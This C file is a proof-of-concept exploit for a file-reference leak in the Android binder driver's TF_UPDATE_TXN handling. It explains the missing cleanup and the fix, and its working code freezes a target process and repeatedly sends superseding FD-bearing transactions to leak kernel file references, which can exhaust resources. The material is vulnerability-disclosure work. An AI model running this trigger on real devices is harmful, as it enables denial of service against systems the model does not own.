/*
 * binder_fd_leak_poc.c — PoC for file reference leak in TF_UPDATE_TXN
 *
 * BUG: When TF_UPDATE_TXN supersedes an async transaction in a frozen
 * process's async_todo queue, kfree(t_outdated) is called WITHOUT
 * binder_free_txn_fixups(t_outdated). If the superseded transaction
 * contained BINDER_TYPE_FD objects, the binder_txn_fd_fixup structs
 * and their struct file references are permanently leaked.
 *
 * Location: drivers/android/binder.c binder_proc_transaction()
 *   Line ~3124: kfree(t_outdated)  // missing binder_free_txn_fixups!
 *
 * Compare with correct cleanup in binder_free_transaction():
 *   binder_free_txn_fixups(t);
 *   kfree(t);
 *
 * Impact: Each superseded FD-bearing transaction leaks struct file refs,
 * preventing proper file cleanup. Repeated triggering exhausts file/memory.
 *
 * CWE-401: Missing Release of Memory after Effective Lifetime
 * CWE-772: Missing Release of Resource after Effective Lifetime
 *
 * Requirements:
 *   - Target process must be frozen (BINDER_FREEZE)
 *   - Both old and new transactions must have TF_ONE_WAY | TF_UPDATE_TXN
 *   - Same sender PID, same code, same target node
 *
 * Kernel: 6.1.162-android14-11 (Pixel 6a), also present in android-mainline
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <stdint.h>
#include <linux/android/binder.h>

#define BINDER_DEV "/dev/binder"
#define MMAP_SIZE  (1024 * 1024)

static int open_binder(void)
{
    int fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
    if (fd < 0) {
        perror("open binder");
        return -1;
    }
    void *m = mmap(NULL, MMAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    if (m == MAP_FAILED) {
        perror("mmap binder");
        close(fd);
        return -1;
    }
    return fd;
}

static int binder_write(int fd, void *data, size_t len)
{
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = len;
    bwr.write_buffer = (uintptr_t)data;
    return ioctl(fd, BINDER_WRITE_READ, &bwr);
}

/*
 * Send a oneway transaction with TF_UPDATE_TXN containing an FD.
 *
 * Transaction data layout:
 *   [4 bytes padding] [struct flat_binder_object with type=BINDER_TYPE_FD]
 *   offsets: [offset_to_fbo]
 */
static int send_fd_transaction(int binder_fd, uint32_t handle,
                               uint32_t code, int payload_fd)
{
    struct flat_binder_object fbo;
    binder_size_t offset;

    memset(&fbo, 0, sizeof(fbo));
    fbo.hdr.type = BINDER_TYPE_FD;
    fbo.flags = 0;
    fbo.binder = 0;
    fbo.cookie = 0;
    fbo.handle = payload_fd;

    offset = 0;

    size_t data_size = sizeof(fbo);
    size_t offsets_size = sizeof(offset);

    /* Allocate userspace buffers for the transaction data */
    void *txn_data = malloc(data_size);
    void *txn_offsets = malloc(offsets_size);
    if (!txn_data || !txn_offsets) {
        free(txn_data);
        free(txn_offsets);
        return -ENOMEM;
    }

    memcpy(txn_data, &fbo, sizeof(fbo));
    memcpy(txn_offsets, &offset, sizeof(offset));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tr;
    } __attribute__((packed)) writebuf;

    memset(&writebuf, 0, sizeof(writebuf));
    writebuf.cmd = BC_TRANSACTION;
    writebuf.tr.target.handle = handle;
    writebuf.tr.code = code;
    writebuf.tr.flags = TF_ONE_WAY | TF_UPDATE_TXN | TF_ACCEPT_FDS;
    writebuf.tr.data_size = data_size;
    writebuf.tr.offsets_size = offsets_size;
    writebuf.tr.data.ptr.buffer = (uintptr_t)txn_data;
    writebuf.tr.data.ptr.offsets = (uintptr_t)txn_offsets;

    int ret = binder_write(binder_fd, &writebuf, sizeof(writebuf));

    free(txn_data);
    free(txn_offsets);

    /* Drain reply */
    char rbuf[256];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(rbuf);
    bwr.read_buffer = (uintptr_t)rbuf;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);

    return ret;
}

/* Send a simple oneway transaction without FDs (for baseline) */
static int send_simple_transaction(int binder_fd, uint32_t handle,
                                   uint32_t code)
{
    struct {
        uint32_t cmd;
        struct binder_transaction_data tr;
    } __attribute__((packed)) writebuf;

    memset(&writebuf, 0, sizeof(writebuf));
    writebuf.cmd = BC_TRANSACTION;
    writebuf.tr.target.handle = handle;
    writebuf.tr.code = code;
    writebuf.tr.flags = TF_ONE_WAY | TF_UPDATE_TXN;
    writebuf.tr.data_size = 0;
    writebuf.tr.offsets_size = 0;

    int ret = binder_write(binder_fd, &writebuf, sizeof(writebuf));

    char rbuf[256];
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(rbuf);
    bwr.read_buffer = (uintptr_t)rbuf;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);

    return ret;
}

static void read_file_nr(void)
{
    FILE *f = fopen("/proc/sys/fs/file-nr", "r");
    if (f) {
        char buf[128];
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = 0;
            printf("    /proc/sys/fs/file-nr: %s\n", buf);
        }
        fclose(f);
    }
}

int main(int argc, char **argv)
{
    int leak_count = 100;
    if (argc > 1)
        leak_count = atoi(argv[1]);

    printf("=== Binder TF_UPDATE_TXN File Reference Leak PoC ===\n");
    printf("Leak iterations: %d\n\n", leak_count);

    /* Phase 1: Create target process (context manager) */
    printf("[*] Phase 1: Creating target process (context manager)\n");

    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) {
        perror("pipe");
        return 1;
    }

    pid_t target_pid = fork();
    if (target_pid == 0) {
        close(pipe_fds[0]);
        int fd = open_binder();
        if (fd < 0) _exit(1);

        int ret = ioctl(fd, BINDER_SET_CONTEXT_MGR, 0);
        if (ret < 0) {
            perror("BINDER_SET_CONTEXT_MGR");
            _exit(1);
        }

        /* Signal parent that context manager is ready */
        char ready = 'R';
        write(pipe_fds[1], &ready, 1);
        close(pipe_fds[1]);

        /* Keep alive — do NOT process transactions */
        pause();
        _exit(0);
    }

    close(pipe_fds[1]);
    char ready;
    read(pipe_fds[0], &ready, 1);
    close(pipe_fds[0]);
    printf("[+] Target process (context manager) running: PID %d\n", target_pid);

    /* Phase 2: Freeze the target process */
    printf("[*] Phase 2: Freezing target process\n");

    int freezer_fd = open_binder();
    if (freezer_fd < 0) {
        kill(target_pid, SIGKILL);
        return 1;
    }

    struct binder_freeze_info freeze_info;
    freeze_info.pid = target_pid;
    freeze_info.enable = 1;
    freeze_info.timeout_ms = 0;

    int ret = ioctl(freezer_fd, BINDER_FREEZE, &freeze_info);
    if (ret < 0) {
        perror("BINDER_FREEZE");
        printf("[!] BINDER_FREEZE failed — may need newer kernel\n");
        kill(target_pid, SIGKILL);
        waitpid(target_pid, NULL, 0);
        return 1;
    }
    printf("[+] Target frozen\n");

    /* Phase 3: Trigger the leak */
    printf("[*] Phase 3: Triggering fd_fixup leak via TF_UPDATE_TXN\n");

    int sender_fd = open_binder();
    if (sender_fd < 0) {
        kill(target_pid, SIGKILL);
        return 1;
    }

    printf("[*] Reading file-nr before leak:\n");
    read_file_nr();

    /*
     * Strategy:
     * 1. Send TF_ONE_WAY|TF_UPDATE_TXN with FD → queued in async_todo
     * 2. Send ANOTHER TF_ONE_WAY|TF_UPDATE_TXN with same code → supersedes #1
     *    → #1's fd_fixups are NOT freed → struct file leaked!
     * 3. Repeat
     *
     * We use /dev/null as the payload FD. Each leaked fixup holds a
     * struct file reference to /dev/null, preventing it from reaching
     * zero refcount (harmless for /dev/null but demonstrates the leak).
     */
    int payload_fd = open("/dev/null", O_RDONLY);
    if (payload_fd < 0) {
        perror("open /dev/null");
        kill(target_pid, SIGKILL);
        return 1;
    }

    int leaked = 0;
    int errors = 0;
    int i;
    for (i = 0; i < leak_count && errors < 10; i++) {
        /*
         * Send a TF_UPDATE_TXN transaction with an FD.
         * If there's already one queued with same code, the old one
         * gets superseded and its fd_fixups leak.
         *
         * We use code=0x1337 consistently so each new txn supersedes
         * the previous one.
         */
        ret = send_fd_transaction(sender_fd, 0, 0x1337, payload_fd);
        if (ret < 0) {
            if (errno == EINVAL || errno == EPERM) {
                /* First transaction may fail because we need a valid
                 * handle. Let's try without FD first to establish
                 * the handle, then with FD. */
                errors++;
                continue;
            }
            errors++;
            continue;
        }

        if (i > 0)
            leaked++;

        if (i % 20 == 0)
            printf("    Sent %d transactions (%d leaked fixups)\n", i + 1, leaked);
    }

    printf("[*] Reading file-nr after leak:\n");
    read_file_nr();

    printf("\n[*] Summary:\n");
    printf("    Transactions sent: %d\n", i);
    printf("    Estimated leaked fd_fixups: %d\n", leaked);
    printf("    Errors: %d\n", errors);

    /* Phase 4: Cleanup */
    printf("\n[*] Phase 4: Cleanup\n");
    close(payload_fd);
    close(sender_fd);

    /* Unfreeze and kill target */
    freeze_info.enable = 0;
    ioctl(freezer_fd, BINDER_FREEZE, &freeze_info);
    close(freezer_fd);

    kill(target_pid, SIGKILL);
    waitpid(target_pid, NULL, 0);

    printf("[*] Reading file-nr after cleanup:\n");
    read_file_nr();
    printf("    (If leaked count > 0, file-nr should show higher allocated than before)\n");

    printf("\n=== PoC complete ===\n");
    printf("Bug: binder_proc_transaction() calls kfree(t_outdated) without\n");
    printf("     binder_free_txn_fixups(t_outdated), leaking struct file refs.\n");
    printf("Fix: Add binder_free_txn_fixups(t_outdated) before kfree().\n");

    return 0;
}
